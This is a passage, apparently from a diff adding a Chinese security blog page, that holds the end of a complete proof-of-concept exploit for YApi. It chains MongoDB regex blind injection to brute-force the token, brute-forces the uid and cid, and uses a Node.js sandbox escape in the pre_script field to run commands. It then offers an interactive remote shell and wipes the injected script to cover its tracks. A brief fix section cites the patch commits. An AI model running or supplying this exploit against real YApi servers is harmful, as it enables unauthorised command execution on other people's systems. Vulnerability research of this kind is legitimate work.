+</span></span><span style="display:flex;"><span>    et <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>  <span style="color:#6272a4"># 加密后的token</span>
+</span></span><span style="display:flex;"><span>    uid <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    pid <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    cid <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pwn</span>(self, token<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>):
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>detect()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> token <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;&#39;</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>bruce_token()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>token <span style="color:#ff79c6">=</span> token
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>bruce_uid()
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>update_project(<span style="color:#f1fa8c">&#34;echo &#39;1145141919810&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>bruce_cid()
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>shell()
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>update_project(<span style="color:#f1fa8c">&#34;&#34;</span>)  <span style="color:#6272a4"># 擦屁股</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">detect</span>(self):
+</span></span><span style="display:flex;"><span>        t <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/api/interface/list&#39;</span>, json<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;token&#34;</span>: {<span style="color:#f1fa8c">&#34;$regex&#34;</span>: <span style="color:#f1fa8c">&#34;^&#34;</span>}})<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;40011&#39;</span> <span style="color:#ff79c6">in</span> t:
+</span></span><span style="display:flex;"><span>            log<span style="color:#ff79c6">.</span>critical(<span style="color:#f1fa8c">&#39;Vulnerability not exist.&#39;</span>)
+</span></span><span style="display:flex;"><span>            sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>        log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Vulnerability Found!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">bruce_token</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">dict</span> <span style="color:#ff79c6">=</span> string<span style="color:#ff79c6">.</span>ascii_lowercase <span style="color:#ff79c6">+</span> string<span style="color:#ff79c6">.</span>digits
+</span></span><span style="display:flex;"><span>        done <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Start bruce forcing token: &#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">20</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">dict</span>:
+</span></span><span style="display:flex;"><span>                guess <span style="color:#ff79c6">=</span> done <span style="color:#ff79c6">+</span> c
+</span></span><span style="display:flex;"><span>                payload <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;token&#34;</span>: {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f1fa8c">&#34;$regex&#34;</span>: <span style="color:#f1fa8c">&#34;^&#34;</span> <span style="color:#ff79c6">+</span> guess,
+</span></span><span style="display:flex;"><span>                    },
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;id&#34;</span>: <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                t <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/api/project/up&#39;</span>, json<span style="color:#ff79c6">=</span>payload)<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;405&#39;</span> <span style="color:#ff79c6">in</span> t:
+</span></span><span style="display:flex;"><span>                    done <span style="color:#ff79c6">=</span> guess
+</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(c, end<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">assert</span> <span style="color:#8be9fd;font-style:italic">len</span>(done) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">20</span>
+</span></span><span style="display:flex;"><span>        log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Found token: &#39;</span> <span style="color:#ff79c6">+</span> done)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>token <span style="color:#ff79c6">=</span> done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">bruce_uid</span>(self):
+</span></span><span style="display:flex;"><span>        log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Start bruce forcing uid: &#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> uid <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># print(&#39;Trying uid: &#39; + str(uid))</span>
+</span></span><span style="display:flex;"><span>            et <span style="color:#ff79c6">=</span> utils<span style="color:#ff79c6">.</span>encode_token(uid, self<span style="color:#ff79c6">.</span>token)
+</span></span><span style="display:flex;"><span>            text <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/api/project/get?token=&#39;</span> <span style="color:#ff79c6">+</span> et)<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;没有权限&#39;</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> text:
+</span></span><span style="display:flex;"><span>                data <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(text)[<span style="color:#f1fa8c">&#39;data&#39;</span>]
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> uid <span style="color:#ff79c6">==</span> data[<span style="color:#f1fa8c">&#39;uid&#39;</span>]:
+</span></span><span style="display:flex;"><span>                    self<span style="color:#ff79c6">.</span>pid <span style="color:#ff79c6">=</span> data[<span style="color:#f1fa8c">&#39;_id&#39;</span>]
+</span></span><span style="display:flex;"><span>                    self<span style="color:#ff79c6">.</span>uid <span style="color:#ff79c6">=</span> uid
+</span></span><span style="display:flex;"><span>                    self<span style="color:#ff79c6">.</span>et <span style="color:#ff79c6">=</span> utils<span style="color:#ff79c6">.</span>encode_token(self<span style="color:#ff79c6">.</span>uid, self<span style="color:#ff79c6">.</span>token)
+</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>()
+</span></span><span style="display:flex;"><span>                    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Found uid: &#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(self<span style="color:#ff79c6">.</span>uid))
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>        log<span style="color:#ff79c6">.</span>critical(<span style="color:#f1fa8c">&#39;uid not found :(&#39;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">update_project</span>(self, cmd):
+</span></span><span style="display:flex;"><span>        code <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;var pwn = function () {
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  Error.prepareStackTrace = (_, c) =&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    c.map((c) =&gt; c.getThis()).find((a) =&gt; a &amp;&amp; a.process);
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  const { stack } = new Error();
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  console.info(stack.process.mainModule);
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  return stack.process.mainModule.require(&#39;child_process&#39;).execSync(&#34;&#39;&#39;&#39;</span> <span style="color:#ff79c6">+</span> cmd<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;&#34;&#39;</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#34;&#39;</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;&#39;&#39;&#34;).toString();
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">};
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">requestHeader = pwn();&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;token&#34;</span>: self<span style="color:#ff79c6">.</span>et,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;id&#34;</span>: self<span style="color:#ff79c6">.</span>pid,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;pre_script&#34;</span>: code
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        t <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/api/project/up&#39;</span>, json<span style="color:#ff79c6">=</span>payload)<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">assert</span> <span style="color:#f1fa8c">&#39;成功&#39;</span> <span style="color:#ff79c6">in</span> t
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">bruce_cid</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> cid <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># print(&#39;Trying cid: &#39; + str(cid))</span>
+</span></span><span style="display:flex;"><span>            text <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;/api/open/run_auto_test?token=</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>token<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&amp;id=</span><span style="color:#f1fa8c">{</span>cid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>)<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;1145141919810&#39;</span> <span style="color:#ff79c6">in</span> text:
+</span></span><span style="display:flex;"><span>                log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#39;Found cid: &#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(cid))
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>()
+</span></span><span style="display:flex;"><span>                self<span style="color:#ff79c6">.</span>cid <span style="color:#ff79c6">=</span> cid
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>        log<span style="color:#ff79c6">.</span>critical(<span style="color:#f1fa8c">&#39;cid not found :(&#39;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">shell</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;Type quit() to quit the shell.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
+</span></span><span style="display:flex;"><span>            cmd <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#39;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> cmd <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;quit()&#39;</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>update_project(cmd)
+</span></span><span style="display:flex;"><span>            text <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;/api/open/run_auto_test?token=</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>token<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&amp;id=</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>cid<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>)<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">assert</span> <span style="color:#f1fa8c">&#39;id值不存在&#39;</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> text
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(text<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;pre&gt;&#39;</span>)[<span style="color:#bd93f9">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    Exp <span style="color:#ff79c6">=</span> NoRegister()
+</span></span><span style="display:flex;"><span>    Exp<span style="color:#ff79c6">.</span>pwn()
+</span></span></code></pre></div><h1 id="修复">修复</h1>
+<p>v1.11.0 修复了mongoDB注入</p>
+<p><a href="https://github.com/YMFE/yapi/commit/432cdfeb29667eea8b82d72a265022ac9515bdb7">https://github.com/YMFE/yapi/commit/432cdfeb29667eea8b82d72a265022ac9515bdb7</a></p>
+<p>v1.12.0则默认关闭了Script，需要手动配置才能打开。</p>
+<p><a href="https://github.com/YMFE/yapi/commit/f856193ded851326a9aea19ff28d1c20c653bbab">https://github.com/YMFE/yapi/commit/f856193ded851326a9aea19ff28d1c20c653bbab</a></p>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞参考信息">漏洞参考信息</a></li>
+    <li><a href="#分析">分析</a>
+      <ul>
+        <li><a href="#yapi">YApi</a></li>
+        <li><a href="#分析commit">分析commit</a></li>
+        <li><a href="#mongodb注入">mongoDB注入</a></li>
+        <li><a href="#pre_script沙箱逃逸">pre_script沙箱逃逸</a></li>
+        <li><a href="#权限控制分析">权限控制分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#攻击思路和poc编写">攻击思路和POC编写</a>
+      <ul>
+        <li><a href="#开放注册">开放注册</a></li>
+        <li><a href="#不开放注册">不开放注册</a>
+          <ul>
+            <li><a href="#布尔盲注">布尔盲注</a></li>
+            <li><a href="#token加解密">token加解密</a></li>
+            <li><a href="#爆破uid">爆破uid</a></li>
+            <li><a href="#update-project">update project</a></li>
+            <li><a href="#爆破cid">爆破cid</a></li>
+            <li><a href="#rce">RCE</a></li>
+          </ul>
+        </li>
+        <li><a href="#完整poc">完整POC</a></li>
+      </ul>
+    </li>
+    <li><a href="#修复">修复</a></li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 </span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
